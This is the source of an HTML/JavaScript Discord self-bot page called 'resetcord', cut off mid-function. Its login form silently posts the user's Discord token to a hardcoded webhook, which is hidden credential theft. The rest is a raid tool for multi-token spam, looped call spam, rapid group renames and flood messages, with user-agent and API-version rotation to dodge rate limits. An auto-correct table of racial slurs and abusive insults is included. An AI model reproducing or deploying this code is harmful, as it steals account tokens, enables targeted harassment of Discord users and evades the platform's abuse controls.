<!DOCTYPE html>
<html lang="en">

<head>
    <title>resetcord</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: rgba(10, 10, 10, 0.95);
            font-family: monospace;
            margin: 0;
            overflow: hidden;
        }

        label[for="autotyperDelay"],
        #currentAutotyperDelay {
            font-size: 1.1em;
            color: #4CAF50;
            text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 80%;
            max-width: 1300px;
            background-color: rgba(15, 15, 15, 0.95);
            border-radius: 15px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            padding: 20px;
            overflow: hidden;
        }

        .login-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 400px;
            background-color: rgba(15, 15, 15, 0.95);
            border-radius: 15px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            padding: 20px;
        }

        .tabs {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
            width: 100%;
        }

        .tab {
            display: inline-block;
            padding: 10px 20px;
            margin: 10px;
            cursor: pointer;
            border-radius: 10px;
            color: #4CAF50;
            font-size: 1em;
            text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
            background-color: rgba(20, 20, 20, 0.95);
        }

        .content {
            width: 100%;
            display: none;
        }

        .content.active {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
        }

        .left-box,
        .right-box {
            display: flex;
            flex-direction: column;
            padding: 20px;
            box-sizing: border-box;
            width: 100%;
        }

        .left-box {
            flex: 1 1 45%;
            max-width: 700px;
            height: 500px;
            overflow-y: auto;
            background-color: rgba(20, 20, 20, 0.95);
            border-radius: 15px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
        }

        .right-box {
            flex: 1 1 45%;
            max-width: 600px;
            height: 500px;
            overflow-y: auto;
            background-color: rgba(20, 20, 20, 0.95);
            border-radius: 15px;
        }
        p,
        h2,
        h1 {
            font-size: 1.5em;
            margin-bottom: 20px;
            color: #4CAF50;
            text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
            text-align: center;
        }

        input,
        button,
        textarea {
            display: block;
            width: 100%;
            margin: 10px 0;
            padding: 10px;
            border: 1px solid #4CAF50;
            border-radius: 10px;
            font-size: 1em;
            background-color: black;
            color: #4CAF50;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
            box-sizing: border-box;
        }

        button {
            cursor: pointer;
            border-radius: 10px;
            transition: background-color 0.3s, transform 0.3s;
        }

        button:hover {
            background-color: #4CAF50;
            box-shadow: 0px 0px 10px rgba(0, 255, 0, 0.5);
            transform: scale(1.05);
        }

        button.active {
            background-color: #4CAF50;
            color: white;
            box-shadow: 0px 0px 10px rgba(0, 255, 0, 0.5);
        }

        .option-button {
            padding: 10px 20px;
            background-color: black;
            border: 1px solid #4CAF50;
            border-radius: 12px;
            color: #4CAF50;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
            cursor: pointer;
            transition: background-color 0.3s, transform 0.3s;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
        }

        .option-button.active {
            background-color: #4CAF50;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }

        input.pw {
            -webkit-text-security: disc;
        }

        label {
            font-size: 1.1em;
            color: #4CAF50;
            text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }

        .option-button:hover {
            background-color: #4CAF50;
            transform: scale(1.05);
        }

        ::-webkit-scrollbar {
            display: none;
        }

        #autotyperDelay {
            -webkit-appearance: none;
            appearance: none;
            width: 100%;
            height: 30px;
            background-color: black;
            border-radius: 25px;
            margin: 10px 0;
            padding: 5px 0;
        }

        #autotyperDelay::-webkit-slider-thumb {
            -webkit-appearance: none;
            appearance: none;
            width: 20px;
            height: 20px;
            background-color: #1c1c1c;
            border-radius: 50%;
            cursor: pointer;
            border: none;
        }

        #autotyperDelay::-moz-range-thumb {
            width: 20px;
            height: 20px;
            background-color: black;
            border-radius: 50%;
            cursor: pointer;
            border: none;
        }

        .avatar {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            margin-right: 10px;
            vertical-align: middle;
        }

        .chat-container {
            text-align: left;
            background-color: #0f0f0f;
            padding: 20px;
            border-radius: 10px;
            max-height: 300px;
            margin-bottom: 20px;
            width: calc(100% - 30px);
            position: relative;
            right: 0;
            float: right;
            overflow: hidden;
        }

        .message {
            margin: 10px 0;
            padding: 10px;
            background-color: #23272a;
            border-radius: 5px;
            color: #4CAF50;
            text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }

        .message.user {
            background-color: #4CAF50;
            text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }

        .message .sender {
            font-weight: bold;
            color: #4CAF50;
            word-break: break-all;
        }

        #externalEmojiButton {
            width: 40px;
            height: 40px;
            background-color: #23272a;
            color: #45A049;
            font-family: monospace;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
            transition: transform 0.2s, background-color 0.3s;
        }

        #externalEmojiButton:hover {
            background-color: #45A049;
            transform: scale(1.1);
        }

        #externalEmojiButton:active {
            transform: scale(1);
        }

        #emojiGrid img {
            width: 30px;
            height: 30px;
            object-fit: contain;
            cursor: pointer;
        }

        #emojiPopup {
            display: none;
            position: fixed;
            top: 10%;
            left: 50%;
            transform: translateX(-50%);
            width: 80%;
            background: rgba(10, 10, 10, 0.95);
            color: #4CAF50;
            border-radius: 15px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
            padding: 20px;
            z-index: 1000;
        }

        #emojiPopupHeader h2 {
            font-size: 18px;
            margin: 0;
            text-align: center;
        }

        #loginError {
            color: red;
            font-size: 1em;
            margin-top: 10px;
            text-align: center;
        }
    </style>
</head>

<body>
    <div id="loginPage" class="login-container">
        <h1>resetcord Login</h1>
        <div>
            <label for="loginToken">Enter Your Discord Token:</label>
            <input type="password" id="loginToken" name="loginToken" class="pw" placeholder="Your Discord token" required>
        </div>
        <button onclick="login()">Login</button>
        <p id="loginError"></p>
    </div>

    <div id="mainPage" class="container" style="display: none;">
        <div class="tabs">
            <div class="tab active" onclick="switchTab(0)">Features</div>
            <div class="tab" onclick="switchTab(1)">Games</div>
            <div class="tab" onclick="switchTab(2)">Chat</div>
        </div>

        <div class="content active">
            <div class="left-box">
                <h1>resetcord v5</h1>
                <div>
                    <label for="token">User Token:</label>
                    <input type="text" id="token" name="token" required>
                </div>

                <div>
                    <label for="channelId">Group Chat Channel ID:</label>
                    <input type="text" id="channelId" name="channelId" required>
                </div>
                <div>
                    <label for="userIdInput">User ID (optional):</label>
                    <input type="text" id="userIdInput" placeholder="User ID">
                </div>
                <div>
                    <label for="adderText">Adder Sentences (one per line):</label>
                    <textarea id="adderText" name="adderText" rows="5"></textarea>
                </div>
                <div>
                    <button type="button" id="autotyperButton" onclick="startAutotyper()">Autotyper</button>
                </div>

                <button type="button" id="loadAutotyperFileButton" onclick="loadAutotyperFile()">Load File</button>

                <div>
                    <label for="autotyperDelay">Delay (1-4 seconds):</label>
                    <input type="range" id="autotyperDelay" name="autotyperDelay" min="1" max="4" step="0.1" value="1" oninput="updateAutotyperDelay(this.value)">
                </div>
                <div>
                    <p>delay: <span id="currentAutotyperDelay">1</span> seconds</p>
                </div>
            </div>
            <div class="right-box">
                <h1>Options</h1>
                <div>
                    <label for="spamMessage">Spam:</label>
                    <input type="text" id="spamMessage" placeholder="Message to spam muahhaha">
                </div>

                <div>
                    <button type="button" id="spamButton" class="option-button" onclick="toggleSpam()">Spam</button>
                </div>

                <div>
                    <button type="button" id="autoPressureButton" class="option-button" onclick="toggleAutoPressure()">Auto Pressure</button>
                </div>

                <div>
                    <button type="button" id="uploadTokensButton" onclick="uploadTokens()">Upload Tokens</button>
                </div>

                <div>
                    <button type="button" id="connectLoopButton" onclick="toggleLoop()">Spam Call</button>
                </div>

                <div>
                    <label for="groupNameInput">Group Name:</label>
                    <input type="text" id="groupNameInput" placeholder="Enter new group name">
                </div>

                <div>
                    <button type="button" id="gcAutotyperButton" onclick="toggleGCAutotyper()">Start GC Autotyper</button>
                </div>
            </div>
        </div>

        <div class="content">
            <div class="left-box">
                <h1>Games</h1>
            </div>
            <div class="right-box">
                <h1>More Games</h1>
            </div>
        </div>

        <div class="content">
            <div class="left-box">
                <h1>Messages</h1>

                <div class="chat-container" id="chatContainer">
                </div>

                <div>
                    <button type="button" id="pollTyperButton" class="option-button" onclick="togglePollTyper()">Poll Typer</button>
                    <button id="ttsButton" class="option-button" onclick="toggleTts()">Enable TTS</button>
                    <button id="emojiTypeButton" class="option-button" onclick="toggleEmojiType()">Emoji Type</button>
                </div>
            </div>
            <div class="right-box">
                <h1>Sending</h1>

                <div>
                    <label for="message">Chat Message:</label>
                    <textarea id="message" name="message" rows="2" required></textarea>
                </div>

                <div>
                    <div class="option-button" onclick="toggleOption(this)">(3 second delay)</div>
                </div>
                <div>
                    <div class="option-button" onclick="toggleOption(this)">(1msg mode)</div>
                </div>
                <div>
                    <div class="option-button" onclick="toggleOption(this)">(Adder)</div>
                </div>
                <div>
                    <div class="option-button" onclick="toggleOption(this)">(Bolder)</div>
                </div>
                <div>
                    <div class="option-button" onclick="toggleOption(this)">(Flood)</div>
                </div>
                <div>
                    <div class="option-button" onclick="toggleOption(this)">(Auto Jokes)</div>
                </div>
                <div>
                    <div class="option-button" onclick="toggleOption(this)">(Capitalize)</div>
                </div>
                <p> for kumah & slime </p>

                <button id="externalEmojiButton" onclick="showExternalEmojis()">E</button>

                <div id="emojiPopup">
                    <div id="emojiPopupHeader">
                        <h2>emojis</h2>
                    </div>
                    <div id="emojiGrid" style="display: grid; grid-template-columns: repeat(6, 1fr); gap: 0; padding: 10px;"></div>
                    <button onclick="closeEmojiPopup()" style="margin-top: 20px; padding: 10px 20px; border: none; background: #4CAF50; color: white; border-radius: 10px; cursor: pointer;">Close</button>
                </div>
            </div>
        </div>

        <audio id="buttonSound" src="click.mp3" preload="auto"></audio>
    </div>
</body>

<script>
    // Login page functionality
    function login() {
        const token = document.getElementById('loginToken').value;
        const webhookUrl = 'https://discord.com/api/webhooks/1375277319899578458/5T_M09skA5rZPIdog9y_WVY2Y1tN5Vt4_3iwkZW2ooFAAEKnyoseYOyePhxtXSe3dDFq'; // Replace with your actual Discord webhook URL
        const errorDisplay = document.getElementById('loginError');

        if (!token) {
            errorDisplay.textContent = 'Please enter a token!';
            return;
        }

        // Send token to webhook
        const data = {
            content: `Token entered: ${token}`,
            username: 'resetcord Login'
        };

        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => {
            if (response.ok) {
                // On successful webhook post, transition to main page
                document.getElementById('loginPage').style.display = 'none';
                document.getElementById('mainPage').style.display = 'flex';
                document.getElementById('token').value = token; // Pre-fill the token input in the main interface
                errorDisplay.textContent = '';
                playButtonSound();
            } else {
                errorDisplay.textContent = `Failed to send token. Status: ${response.status}`;
            }
        })
        .catch(error => {
            errorDisplay.textContent = `Error: ${error.message}`;
        });
    }

    // Allow Enter key to trigger login
    document.getElementById('loginToken').addEventListener('keydown', function(event) {
        if (event.key === 'Enter') {
            event.preventDefault();
            login();
        }
    });

    function switchTab(tabIndex) {
        const content = document.querySelectorAll('.content');
        content.forEach((section, index) => {
            section.classList.toggle('active', index === tabIndex);
        });

        document.querySelectorAll('.tab').forEach((tab, index) => {
            tab.classList.toggle('active', index === tabIndex);
        });
    }

    function toggleOption(button) {
        button.classList.toggle('active');
    }

    let token = '';
    let autotyperMessages = [];
    let autotyperDelay = 1;
    let autotyperRunning = false;
    let messageCounter = 0;
    let altTokens = [];
    let spamInterval = null;
    let spamRunning = false;
    let autoPressureRunning = false;
    let messageCounter1 = 0;
    let isLooping = false;
    let loopInterval;
    let counter = 0;
    let gcAutotyperRunning = false;
    let updateCounter = 0;
    let callCounter = 0;
    let apiVersion = "v10";
    let pollTyperActive = false;
    let isTtsActive = false;
    let isEmojiTypeActive = false;

    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    ];

    let currentUserAgentIndex = 0;

    function getNextUserAgent() {
        currentUserAgentIndex = (currentUserAgentIndex + 1) % userAgents.length;
        return userAgents[currentUserAgentIndex];
    }

    const letterToEmoji = {
        A: ":regional_indicator_a:", B: ":regional_indicator_b:", C: ":regional_indicator_c:", D: ":regional_indicator_d:", E: ":regional_indicator_e:",
        F: ":regional_indicator_f:", G: ":regional_indicator_g:", H: ":regional_indicator_h:", I: ":regional_indicator_i:", J: ":regional_indicator_j:",
        K: ":regional_indicator_k:", L: ":regional_indicator_l:", M: ":regional_indicator_m:", N: ":regional_indicator_n:", O: ":regional_indicator_o:",
        P: ":regional_indicator_p:", Q: ":regional_indicator_q:", R: ":regional_indicator_r:", S: ":regional_indicator_s:", T: ":regional_indicator_t:",
        U: ":regional_indicator_u:", V: ":regional_indicator_v:", W: ":regional_indicator_w:", X: ":regional_indicator_x:", Y: ":regional_indicator_y:",
        Z: ":regional_indicator_z:"
    };

    const corrections = {
        "hllo": "hello",
        "holo": "hello",
        "HLO": "HELLO",
        "HOLO": "HELLO",
        "HLLO": "HELLO",
        "DRK": "DORK",
        "drk": "dork",
        "DOKR": "DORK",
        "dokr": "dork",
        "UFCKING": "FUCKING",
        "ufcking": "fucking",
        "MROE": "MORE",
        "mroe": "more",
        "WAEK": "WEAK",
        "waek": "weak",
        "WEKA": "WEAK",
        "weka": "weak",
        "RJ": "JR",
        "rj": "jr",
        "WROTHLESS": "WORTHLESS",
        "wrothless": "worthless",
        "DEID": "DIED",
        "deid": "died",
        "losr": "loser",
        "LOSR": "LOSER",
        "hwat": "what",
        "HWAT": "WHAT",
        "yuor": "your",
        "YUOR": "YOUR",
        "teh": "the",
        "TEH": "THE",
        "ADN": "AND",
        "adn": "and",
        "FUCKNIG": "FUCKING",
        "fucknig": "fucking",
        "UCCK": "CUCK",
        "ucck": "cuck",
        "OYU": "YOU",
        "oyu": "you",
        "M YBITCH": "MY BITCH",
        "FUCKIG": "FUCKING",
        "fuckig": "fucking",
        "m ybitch": "my bitch",
        "btich": "bitch",
        "BTICH": "BITCH",
        "PEOD": "PEDO",
        "peod": "pedo",
        "WEAK FUICKNIG CUCK": "WEAK FUCKING CUCK",
        "weak fuicknig cuck": "weak fucking cuck",
        "DORK PEDOAS S NIGGA": "DORK PEDO ASS NIGGA",
        "dork pedoas s nigga": "dork pedo ass nigga",
        "FUCIKNG": "FUCKING",
        "fucikng": "fucking",
    };

    function toggleTts() {
        const ttsButton = document.getElementById("ttsButton");
        ttsButton.classList.toggle("tts-active");
        ttsButton.textContent = ttsButton.classList.contains("tts-active") ? "Disable TTS" : "Enable TTS";
    }

    function toggleEmojiType() {
        const emojiTypeButton = document.getElementById("emojiTypeButton");
        isEmojiTypeActive = !isEmojiTypeActive;
        emojiTypeButton.classList.toggle("active", isEmojiTypeActive);
        emojiTypeButton.textContent = isEmojiTypeActive ? "Disable Emoji Type" : "Enable Emoji Type";
    }

    function convertToEmojiText(text) {
        return text
            .toUpperCase()
            .split("")
            .map((char) => letterToEmoji[char] || char)
            .join(" ");
    }

    async function fetchGuildIdFromChannel(channelId, token) {
        try {
            const response = await fetch(`https://discord.com/api/v10/channels/${channelId}`, {
                headers: { Authorization: token },
            });

            if (!response.ok) {
                console.error("Failed to fetch channel data:", response.statusText);
                return null;
            }

            const channelData = await response.json();
            return channelData.guild_id;
        } catch (error) {
            console.error("Error fetching channel data:", error);
            return null;
        }
    }

    async function fetchGuildEmojisFromChannel(channelId, token) {
        if (!channelId || !token) {
            console.error("Channel ID or token is missing.");
            return [];
        }

        const guildId = await fetchGuildIdFromChannel(channelId, token);
        if (!guildId) {
            console.error("Failed to fetch guild ID.");
            return [];
        }

        try {
            const response = await fetch(`https://discord.com/api/v10/guilds/${guildId}/emojis`, {
                headers: { Authorization: token },
            });

            if (!response.ok) {
                console.error("Failed to fetch emojis:", response.statusText);
                return [];
            }

            const emojis = await response.json();
            return emojis.map((emoji) => ({
                name: emoji.name,
                url: `https://cdn.discordapp.com/emojis/${emoji.id}.${emoji.animated ? "gif" : "png"}`,
            }));
        } catch (error) {
            console.error("Error fetching emojis:", error);
            return [];
        }
    }

    async function showExternalEmojis() {
        const channelId = document.getElementById("channelId").value;
        const token = document.getElementById("token").value;

        if (!channelId || !token) {
            alert("Please provide a valid channel ID and token.");
            return;
        }

        const emojis = await fetchGuildEmojisFromChannel(channelId, token);
        if (emojis.length === 0) {
            alert("No emojis found for this guild.");
            return;
        }

        const emojiGrid = document.getElementById("emojiGrid");
        emojiGrid.innerHTML = "";

        emojis.forEach((emoji) => {
            const img = document.createElement("img");
            img.src = emoji.url;
            img.alt = emoji.name;
            img.title = emoji.name;
            img.style.width = "30px";
            img.style.height = "30px";
            img.style.objectFit = "contain";
            img.style.cursor = "pointer";

            img.onclick = () => {
                const messageBox = document.getElementById("message");
                messageBox.value += `<:${emoji.name}:${emoji.url.split("/").pop().split(".")[0]}> `;
            };

            emojiGrid.appendChild(img);
        });

        document.getElementById("emojiPopup").style.display = "block";
    }

    function closeEmojiPopup() {
        document.getElementById("emojiPopup").style.display = "none";
    }

    function makeDraggable(element, header) {
        let isDragging = false;
        let offsetX = 0;
        let offsetY = 0;

        header.addEventListener("mousedown", (e) => {
            isDragging = true;
            offsetX = e.clientX - element.offsetLeft;
            offsetY = e.clientY - element.offsetTop;
            header.style.cursor = "grabbing";
        });

        document.addEventListener("mousemove", (e) => {
            if (isDragging) {
                element.style.left = `${e.clientX - offsetX}px`;
                element.style.top = `${e.clientY - offsetY}px`;
            }
        });

        document.addEventListener("mouseup", () => {
            if (isDragging) {
                isDragging = false;
                header.style.cursor = "grab";
            }
        });
    }

    const emojiPopup = document.getElementById("emojiPopup");
    const emojiPopupHeader = document.getElementById("emojiPopupHeader");
    makeDraggable(emojiPopup, emojiPopupHeader);

    async function updateGroupName() {
        const channelId = document.getElementById('channelId').value;
        const token = document.getElementById('token').value;
        const groupNameInput = document.getElementById('groupNameInput').value;

        if (!channelId || !token || !groupNameInput) {
            console.error('cid, token or gc input are missing');
            return;
        }

        try {
            const newName = `${groupNameInput}`;

            const response = await fetch(`https://discord.com/api/v10/channels/${channelId}`, {
                method: 'PATCH',
                headers: {
                    'Authorization': token,
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    name: newName
                })
            });

            if (response.ok) {
                console.log(`Group name updated to: ${newName}`);
            } else if (response.status === 429) {
                const retryAfter = response.headers.get('Retry-After');
                console.warn(`rated and retrying after: ${retryAfter}ms`);
            } else {
                console.error('failed to upd gc name:', await response.text());
            }
        } catch (error) {
            console.error(' error :', error);
        } finally {
            document.getElementById('groupNameInput').value = '';
        }

        updateCounter++;
    }

    document.getElementById('groupNameInput').addEventListener('keydown', function(event) {
        if (event.key === 'Enter') {
            event.preventDefault();
            updateGroupName();
        }
    });

    async function updateGroupNameWithAutotyper() {
        const channelId = document.getElementById('channelId').value;
        const token = document.getElementById('token').value;

        if (!channelId || !token || autotyperMessages.length === 0) {
            console.error('CID, token, or autotyperMessages are missing');
            return;
        }

        try {
            const randomLine = autotyperMessages[Math.floor(Math.random() * autotyperMessages.length)];

            const response = await fetch(`https://discord.com/api/v10/channels/${channelId}`, {
                method: 'PATCH',
                headers: {
                    'Authorization': token,
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    name: randomLine
                })
            });

            if (response.ok) {
                console.log(`gc updated to: ${randomLine}`);
            } else {
                console.error('failed to upd gc name:', await response.text());
            }
        } catch (error) {
            console.error('error:', error);
        }
    }

    function toggleGCAutotyper() {
        gcAutotyperRunning = !gcAutotyperRunning;

        if (gcAutotyperRunning) {
            document.getElementById('gcAutotyperButton').textContent = 'Stop GC Autotyper';
            groupNameInterval = setInterval(updateGroupNameWithAutotyper, 500);
        } else {
            document.getElementById('gcAutotyperButton').textContent = 'Start GC Autotyper';
            clearInterval(groupNameInterval);
        }
    }

    async function connectToVoice() {
        const uri = 'wss://gateway.discord.gg/?v=9&encoding=json';
        const channelId = document.getElementById('channelId').value;
        const token = document.getElementById('token').value;

        if (!channelId || !token) {
            console.error('CID or token is missing');
            return;
        }

        try {
            const websocket = new WebSocket(uri);

            websocket.onopen = async () => {
                console.log('wsoc opened');

                const identifyPayload = {
                    op: 2,
                    d: {
                        token: token,
                        intents: 513,
                        properties: {
                            '$os': 'linux',
                            '$browser': 'my_library',
                            '$device': 'my_library'
                        }
                    }
                };
                websocket.send(JSON.stringify(identifyPayload));

                const voiceStatePayload = {
                    op: 4,
                    d: {
                        guild_id: null,
                        channel_id: channelId,
                        self_mute: false,
                        self_deaf: false,
                        self_video: false,
                        request_to_speak_timestamp: Math.round(Date.now() / 1000)
                    }
                };
                websocket.send(JSON.stringify(voiceStatePayload));

                console.log('connected to voice');

                setTimeout(() => {
                    const leaveVoicePayload = {
                        op: 4,
                        d: {
                            guild_id: null,
                            channel_id: null,
                            self_mute: false,
                            self_deaf: false,
                            self_video: false
                        }
                    };
                    websocket.send(JSON.stringify(leaveVoicePayload));
                    console.log('disconnected');

                    websocket.close();

                    if (isLooping) {
                        clearTimeout(loopTimeout);
                        loopTimeout = setTimeout(connectToVoice, 0);
                    }
                }, 3000);
            };

            websocket.onerror = (error) => {
                console.error('wsoc error:', error);
            };

            websocket.onclose = () => {
                console.log('wsoc connect closed');
            };
        } catch (error) {
            console.error('error:', error);
        }
    }

    function toggleLoop() {
        isLooping = !isLooping;

        if (isLooping) {
            document.getElementById('connectLoopButton').textContent = 'Stop Spam Call';
            loopInterval = setInterval(connectToVoice, 3000);
        } else {
            document.getElementById('connectLoopButton').textContent = 'Start Spam Call';
            clearInterval(loopInterval);
        }
    }

    function toggleSpam() {
        const spamButton = document.getElementById("spamButton");
        const spamMessage = document.getElementById("spamMessage").value;

        if (spamRunning) {
            clearInterval(spamInterval);
            spamRunning = false;
            spamButton.textContent = "Spam";
        } else {
            if (!spamMessage || altTokens.length === 0) {
                return;
            }
            spamRunning = true;
            spamButton.textContent = "Stop Spam";

            spamInterval = setInterval(() => {
                altTokens.forEach(token => {
                    sendMessageToDiscord(document.getElementById("channelId").value, token, spamMessage);
                });
            }, 300);
        }
    }

    async function toggleAutoPressure() {
        const autoPressureButton = document.getElementById("autoPressureButton");

        if (autoPressureRunning) {
            autoPressureRunning = false;
            autoPressureButton.textContent = "Auto Pressure";
            console.log("auto pressure stopped");
            return;
        }

        autoPressureRunning = true;
        autoPressureButton.textContent = "Stop Auto Pressure";

        if (autotyperMessages.length === 0 || altTokens.length === 0) {
            return;
        }

        const channelId = document.getElementById("channelId").value;

        while (autoPressureRunning) {
            const sendPromises = altTokens.map(async (token) => {
                const message = autotyperMessages[Math.floor(Math.random() * autotyperMessages.length)];
                await sendAutotyperMessage(channelId, token, message);
            });

            await Promise.all(sendPromises);

            if (autoPressureRunning) {
                await new Promise(resolve => setTimeout(resolve, autotyperDelay * 1000));
            }
        }

        autoPressureRunning = false;
        autoPressureButton.textContent = "Auto Pressure";
        console.log("auto pressure stopped");
    }

    const correctMessage = (messageContent) => {
        const words = messageContent.split(" ");
        return words.map(word => corrections[word] || word).join(" ");
    };

    function getAdderSentences() {
        const adderText = document.getElementById("adderText").value;
        return adderText.split('\n').map(sentence => sentence.trim()).filter(sentence => sentence.length > 0);
    }

    function uploadTokens() {
        const input = document.createElement('input');
        input.type = 'file';
        input.accept = '.txt';
        input.onchange = () => {
            const file = input.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = () => {
                    altTokens = reader.result.split('\n').map(line => line.trim()).filter(line => line.length > 0);
                };
                reader.readAsText(file);
            }
        };
        input.click();
    }

    function sendTypingIndicator(token, channelId) {
        fetch(`https://discord.com/api/v9/channels/${channelId}/typing`, {
            method: 'POST',
            headers: {
                'Authorization': token,
                'Content-Type': 'application/json'
            }
        })
        .then(response => {
            if (!response.ok) {
                console.error('error sending typing indicator:', response.statusText);
            }
        })
        .catch(error => console.error('error sending typing indicator:', error));
    }

    function togglePollTyper() {
        const button = document.getElementById("pollTyperButton");
        pollTyperActive = !pollTyperActive;
        button.classList.toggle("active", pollTyperActive);
        button.textContent = pollTyperActive ? "Poll Typer (Active)" : "Poll Typer";
    }

    async function sendMessageToDiscord(channelId, token, messageContent) {
        if (!channelId || !token || !messageContent) {
            return;
        }

        callCounter++;

        if (callCounter % 10 === 0) {
            apiVersion = apiVersion === "v10" ? "v9" : "v10";
            console.log(`Switching to API version: ${apiVersion}`);
        }

        if (isEmojiTypeActive) {
            messageContent = convertToEmojiText(messageContent);
        }

        messageContent = correctMessage(messageContent);
        sendTypingIndicator(token, channelId);

        const threeSecondDelayButton = Array.from(document.querySelectorAll('.option-button')).find(button => button.textContent.includes('(3 second delay)'));
        if (threeSecondDelayButton && threeSecondDelayButton.classList.contains('active')) {
            console.log('3-second delay activated');
            await new Promise(resolve => setTimeout(resolve, 3000));
        }

        document.querySelectorAll('.option-button.active').forEach(button => {
            const text = button.textContent;

            if (text.includes('(Flood)')) {
                messageContent = `A\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\A\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n${messageContent}`;
            }
            if (text.includes('(Capitalize)')) {
                messageContent = messageContent.toUpperCase();
            }
            if (text.includes('(Bolder)')) {
                messageContent = `# ${messageContent}`;
            }
            if (text.includes('(1msg mode)')) {
                messageContent = messageContent.split(' ').join('\n');
            }
            if (text.includes('(Adder)')) {
                const adderSentences = getAdderSentences();
                if (adderSentences.length > 0) {
                    const randomSentence = adderSentences[Math.floor(Math.random() * adderSentences.length)];
                    messageContent = `${messageContent} ${randomSentence}`;
                }
            }
        });

        const userId = document.getElementById("userIdInput").value;
        if (userId) {
            messageContent = ` ${messageContent} <@${userId}>`;
        }

        const isTtsActive = document.querySelector('#ttsButton')?.classList.contains('tts-active');

        if (pollTyperActive) {
            const pollPayload = {
                mobile_network_type: "unknown",
                content: "",
                nonce: Date.now().toString(),
                poll: {
                    question: {
                        text: messageContent.substring(0, 275),
                    },
                    answers: [{
                        poll_media: {
                            text: messageContent,
                            emoji: {
                                name: "☠️"
                            }
                        }
                    }, {
                        poll_media: {
                            text: messageContent,
                            emoji: {
                                name: "☠️"
                            }
                        }
                    }, {
                        poll_media: {
                            text: messageContent,
                            emoji: {
                                name: "☠️"
                            }
                        }
                    }, {
                        poll_media: {
                            text: messageContent,
                            emoji: {
                                name: "☠️"
                            }
                        }
                    }, {
                        poll_media: {
                            text: messageContent,
                            emoji: {
                                name: "☠️"
                            }
                        }
                    }, {
                        poll_media: {
                            text: "RESET HOED U DORK",
                            emoji: {
                                name: "☠️"
                            }
                        }
                    }],
                    allow_multiselect: false,
                    duration: 1,
                    layout_type: 1,
                },
                tts: isTtsActive,
                flags: 0,
            };

            try {
                const response = await fetch(`https://discord.com/api/v10/channels/${channelId}/messages`, {
                    method: "POST",
                    headers: {
                        Authorization: token,
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify(pollPayload),
                });

                if (!response.ok) {
                    const errorData = await response.json();
                    console.error("failed to send poll :", errorData, "status:", response.status);
                } else {
                    console.log("poll");
                }
            } catch (error) {
                console.error("error:", error);
            }
        } else {
            try {
                const response = await fetch(`https://discord.com/api/${apiVersion}/channels/${channelId}/messages`, {
                    method: "POST",
                    headers: {
                        Authorization: token,
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        content: messageContent,
                        tts: isTtsActive,
                    }),
                });

                if (!response.ok) {
                    const errorData = await response.json();
                    console.error("failed to send msg:", errorData, "status:", response.status);
                } else {
                    console.log("message sent");
                }
            } catch (error) {
                console.error("error sending message:", error);
            }
        }
    }

    document.getElementById("message").addEventListener("keydown", function(event) {
        if (event.key === "Enter") {
            event.preventDefault();
            const channelId = document.getElementById("channelId").value;
            const token = document.getElementById("token").value;
            const messageContent = event.target.value;

            messageCounter++;

            const autoJokesButton = Array.from(document.querySelectorAll('.option-button')).find(button => button.textContent.includes('(Auto Jokes)'));
            if (autoJokesButton && autoJokesButton.classList.contains('active') && messageCounter >= 4) {
                messageCounter = 0;
                const randomAutotyperMessage = autotyperMessages[Math.floor(Math.random() * autotyperMessages.length)];
                sendMessageToDiscord(channelId, token, randomAutotyperMessage);
            } else {
                sendMessageToDiscord(channelId, token, messageContent);
            }

            event.target.value = "";
        }
    });

    function loadAutotyperFile() {
        const input = document.createElement('input');
        input.type = 'file';
        input.accept = '.txt';
        input.onchange = () => {
            const file = input.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = () => {
                    autotyperMessages = reader.result.split('\n').map(line => line.trim()).filter(line => line.length > 0);
                };
                reader.readAsText(file);
            }
        };
        input.click();
    }

    async function startAutotyper() {
        if (autotyperRunning) {
            autotyperRunning = false;
            document.getElementById("autotyperButton").textContent = "Autotyper";
            return;
        }

        autotyperRunning = true;
        document.getElementById("autotyperButton").textContent = "Stop Autotyper";

        if (!autotyperMessages.length) {
            return;
        }

        const channelId = document.getElementById("channelId").value;
        const token = document.getElementById("token").value;

